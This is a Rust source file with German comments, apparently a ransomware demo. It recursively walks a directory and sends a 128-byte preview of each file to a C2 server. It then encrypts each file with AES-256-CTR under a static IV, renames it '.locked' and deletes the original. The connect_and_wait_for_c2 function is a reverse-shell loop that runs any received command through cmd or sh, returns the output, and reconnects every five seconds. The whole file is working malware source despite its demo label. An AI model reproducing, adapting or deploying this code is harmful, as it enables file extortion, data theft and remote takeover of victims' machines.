use aes::cipher::{KeyIvInit, StreamCipher};
use anyhow::{Context, Result};
use rand::{Rng, thread_rng};
use std::process::{Command, Output};
use std::thread;
use std::time::Duration;
use std::{
    fs::{self, File},
    io::{BufReader, BufWriter, Read, Write, Error, ErrorKind},
    net::TcpStream,
    path::{Path, PathBuf},
};
use walkdir::WalkDir;

// AES-256 im CTR (Counter) Modus
// CTR verwandelt Block-Cipher in Stream-Cipher
type Aes256Ctr = ctr::Ctr64BE<aes::Aes256>;

/// Kryptographisch sicheren 256-Bit Schlüssel + speichert diesen
///
/// # Arguments
/// * `base_path` - Pfad, in dem die Schlüsseldatei `rescue.key` gespeichert werden soll.
///
/// # Returns
/// generierten Schlüssel als 32-Byte Array zurück oder einen Fehler.
fn key_generate_and_save(base_path: &Path) -> Result<[u8; 32]> {
    let mut key = [0u8; 32];
    thread_rng().fill(&mut key);

    let key_path = base_path.join("rescue.key");

    // key in eine Datei schreiben -> Bei Fehler: with_context gibt Fehlermeldung
    fs::write(&key_path, &key)
        .with_context(|| format!("Konnte Schlüsseldatei nicht schreiben: {:?}", key_path))?;

    println!("[+] Schlüssel generiert und gespeichert: {:?}", key_path);
    Ok(key)
}

fn read_file_contents(path: &Path) -> Result<Vec<u8>> {
    let preview_size = 128;
    let mut file = File::open(path)?;

    let mut buffer = vec![0u8; preview_size];

    let count = file.read(&mut buffer)?;

    buffer.truncate(count);

    Ok(buffer)
}

fn send_to_c2(data: &[u8]) {
    // verbindung zu python Server aufbauen
    if let Ok(mut stream) = TcpStream::connect("127.0.0.1:8080") {
        let _ = stream.write_all(data);
    }
}

fn data_exfiltration(path: &Path) -> Result<()> {
    let file_content = read_file_contents(path)?;

    if let Ok(text) = String::from_utf8(file_content.clone()) {
        println!("    [UPLOAD] Inhalt: {}", text);
    } else {
        println!("    [UPLOAD] Binärdaten: {:02X?}", file_content);
    }

    // Content an C2-Server senden
    send_to_c2(&file_content);

    Ok(())
}

/// Verschlüsselt eine Datei mit AES-256-CTR
///
/// Funktion nutzt Streaming (puffer), damit auch große Dateien speicherschonend verarbeitet werden
/// können.
/// List chung-weise, verschlüsselt und schreibt in eine temp-Datei
/// Bei Erfolg: Original wird überschrieben.
///
/// # Arguments
/// * `path` - Pfad zur Datei, die verschlüsselt werden soll
/// * `key` - AES-Schlüssel.
/// * `iv` - Initialisierungsvektor
fn encrypt_file_safe(path: &Path, key: &[u8; 32], iv: &[u8; 16]) -> Result<()> {
    let input_file = File::open(path)?;
    let mut reader = BufReader::new(input_file);

    let temp_path = path.with_extension("enc_temp");
    let output_file = File::create(&temp_path)?;
    let mut writer = BufWriter::new(output_file);

    let mut cipher = Aes256Ctr::new(key.into(), iv.into());

    let mut buffer = [0u8; 4096];

    loop {
        let count = reader.read(&mut buffer)?;
        if count == 0 {
            break;
        }

        let chunk = &mut buffer[..count];
        cipher.apply_keystream(chunk);

        writer.write_all(chunk)?;
    }

    // Puffer leeren
    writer.flush()?;

    drop(reader);
    drop(writer);

    // originialdatei mit verschlüsselter ersetzten
    fs::rename(&temp_path, path.with_extension("locked"))
        .context("Fehler beim Umbenennen der verschlüsselten Datei")?;

    if path.exists() {
        fs::remove_file(path).ok();
    }

    println!("    -> Verschlüsselt: {:?}", path.file_name().unwrap());
    Ok(())
}

/// Durchsucht DIR rekursiv und verschlüsselt
///
/// # Arguments
/// * `target_dir` - Root-Dir für den Angriff
fn run_malware_demo(target_dir: &str) -> Result<()> {
    let root_path = PathBuf::from(target_dir);
    if !root_path.exists() {
        anyhow::bail!("Zielverzeichnis existiert nicht: {}", target_dir);
    }

    println!("[*] Starte Demo in: {:?}", root_path);

    // Key-Gen
    let key = key_generate_and_save(&root_path)?;

    // Statischer IV
    let iv = [0u8; 16];

    // Rekursiv durch das Filesystem laufen
    let walker = WalkDir::new(&root_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file());

    for entry in walker {
        let path = entry.path();

        if path.ends_with("rescue.key") || path.extension().map_or(false, |ext| ext == "locked") {
            continue;
        }

        match data_exfiltration(&path) {
            Ok(_) => {}
            Err(e) => eprintln!(" [!] Fehler beim versenden der Daten {:?}: {}", path, e),
        }

        match encrypt_file_safe(path, &key, &iv) {
            Ok(_) => {}
            Err(e) => eprintln!("    [!] Fehler bei {:?}: {}", path, e),
        }
    }

    println!("[*] Vorgang abgeschlossen.");
    Ok(())
}


enum OperatingSystem {
    Windows,
    Linux,
    MacOS,
    Unknown,
}

fn get_operating_system() -> OperatingSystem {
    if cfg!(windows) {
        return OperatingSystem::Windows;
    } else if cfg!(target_os = "macos") {
        return OperatingSystem::MacOS;
    } else if cfg!(unix) {
        return OperatingSystem::Linux;
    } else {
        return OperatingSystem::Unknown;
    }
}

pub fn connect_and_wait_for_c2(target_dir: String, c2_ip: &str, c2_port: u16) {
    let server_addr = format!("{}:{}", c2_ip, c2_port);
    println!(
        "[*] Starte C2-Loop. Zielverzeichnis für 'encrypt': {}",
        target_dir
    );

    loop {
        match TcpStream::connect(&server_addr) {
            Ok(mut stream) => {
                println!("[*] Mit C2 Server verbunden: {}", server_addr);

                let mut buffer = [0u8; 4096];

                loop {
                    match stream.read(&mut buffer) {
                        Ok(size) => {
                            if size == 0 {
                                // Verbindung vom Server geschlossen
                                println!("[!] Server hat Verbindung geschlossen.");
                                break;
                            }

                            // Befehl zu String umwandeln, whitespace entfernen
                            let raw_command = String::from_utf8_lossy(&buffer[..size]);
                            let command = raw_command.trim();

                            println!("[*] Befehl erhalten: {}", command);

                            let output_to_send: String;

                            if command == "encrypt" {
                                // Start Befehl für Verschlüsselung
                                output_to_send = match run_malware_demo(&target_dir) {
                                    Ok(_) => {
                                        "Verschlüsselung erfolgreich abgeschlossen.\n".to_string()
                                    }
                                    Err(e) => format!("Fehler bei Verschlüsselung: {}\n", e),
                                };
                            } else {
                                // match for Operating System
                                let shell_cmd: Result<Output, Error> = match get_operating_system() {
                                    OperatingSystem::Windows => {
                                        Command::new("cmd").args(["/C", command]).output()
                                    }
                                    OperatingSystem::Linux | OperatingSystem::MacOS => {
                                        Command::new("sh").arg("-c").arg(command).output()
                                    }
                                    OperatingSystem::Unknown => {
                                        Err(Error::new(
                                            ErrorKind::Other,
                                            "Unbekanntes Betriebssystem",
                                        ))
                                    }
                                };


                                output_to_send = match shell_cmd {
                                    Ok(output) => {
                                        let stdout = String::from_utf8_lossy(&output.stdout);
                                        let stderr = String::from_utf8_lossy(&output.stderr);
                                        format!("{}{}", stdout, stderr)
                                    }
                                    Err(e) => format!("Fehler beim Ausführen des Befehls: {}\n", e),
                                };
                            }

                            // Ergebnis wieder an den Server senden
                            if let Err(e) = stream.write_all(output_to_send.as_bytes()) {
                                println!("[!] Fehler beim Senden der Antwort: {}", e);
                                break;
                            }
                        }
                        Err(e) => {
                            println!("[!] Fehler beim Lesen vom Socket: {}", e);
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                println!(
                    "[!] Verbindung fehlgeschlagen ({}). Neuer Versuch in 5s...",
                    e
                );
            }
        }

        // 5 Sekunden schlafen, dann neu verbinden
        thread::sleep(Duration::from_secs(5));
    }
}
